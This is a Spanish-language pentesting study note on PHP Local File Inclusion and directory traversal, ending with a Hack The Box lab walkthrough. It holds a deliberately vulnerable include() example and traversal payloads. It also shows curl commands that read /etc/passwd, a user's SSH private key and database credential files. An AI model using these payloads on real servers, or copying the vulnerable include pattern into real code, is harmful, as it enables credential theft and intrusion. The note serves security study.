** Local File Inclusion (Inclusión local de archivos) **
Vulnerabilidad asociada a una mala programación en funciones PHP para incluir / llamar a archivos. Este fallo permite incluir archivos locales del servidor donde se aloja el recurso web en la llamada a archivos en la función.

--> Comprobar si es vulnerable:
	`http://localhost/index.php?page=loquesea`
	salida --> Warning: main()...   o   Warning: include()....
	
--> Código vulnerable vs Código seguro:
	`<?php include $_GET['pagina']; ?>`	|| `<?php include('pagina.php'); ?>`
	
==================================================================

** Directory Traversal / Path Traversal Attack **
Un servidor vulnerable a LFI es posible que sea vulnerable a Directory Traversal, esta técnica utiliza "../" para recorrer hacia atrás en el sistema de ficheros del servidor local.
	`http://example.com/?file=../../../../etc/passwd`
	
==================================================================
	
** Pruebas de vulnerabilidad en equipo local **
Directorio web de Apache --> `/var/www/html`
Arrancar servicio Apache --> `service apache2 start`
Comprobar uso del puerto 80 --> `lsof -i:80`

Fichero vulnerable a LFI, example.php. Función include, vulnerable a LFI -->
``` php
<?php
	$filename=$_GET['file'];
	include($filename);
?>
```
Ver archivo local desde el navegador --> `http://localhost/example.php?file=/etc/passwd`
Otros ficheros importantes --> `/etc/group`, `/proc/sched_debug`
Ver archivo local desde la CLI
> Buscar usuarios que tengan asociada una shell
> `curl -s "http://localhost/example.php?file=/etc/passwd" | grep 'sh$'`
> Ver clave privada rsa para conectarnos vía ssh. Si la clave tiene contraseña, debería crackearse con ssh2john.
> `curl -s "http://localhost/example.php?file=/home/s4vitar/.ssh/id_rsa"`

==================================================================

** Enumeración gracias a LFI **
> Fichero que muestra procesos de las tareas en ejecución --> `/proc/sched_debug`
> Enumeración de IPs o Interfaces de red disponibles --> `/proc/net/fib_trie`
> Enumeración de puertos públicos o privados --> `/proc/net/tcp`

==================================================================

** Ejemplos de esta vulnerabilidad en entornos reales ** 
Elastic vulnerability lfi
`../../../../../../../../etc/amporta.conf%00&module=Accounts&action`



==================================================================

** Ejemplos **
1. Máquina Breadcrumbs_HTB.
	1. En la página http://10.10.10.228/php/books.php hay un formulario para obtener una lista de libros.
	2. Estos seguramente serán obtenidos de una base de datos.
	3. Capturamos petición con Burpsuite.
	4. En los parámetros de la petición encontramos:
		1. ...title=test&author=test&book=test&method=1
		2. Probando en cada uno de los parámetros, book direcciona hacia un recurso donde se encuentra la información.
		3. Muy probablemente sea objeto de LFI.
		4.  ...title=test&author=test&book=../includes/bookController.php&method=1
		5.  Lectura del código PHP de esa página gracias que es vulnerable a:
			1.  Directory Path Traversal
			2.  Local File Inclusion
		6.  Posibles credenciales: 
			1.   ...title=test&author=test&book=../db/db.php&method=1
			
2.   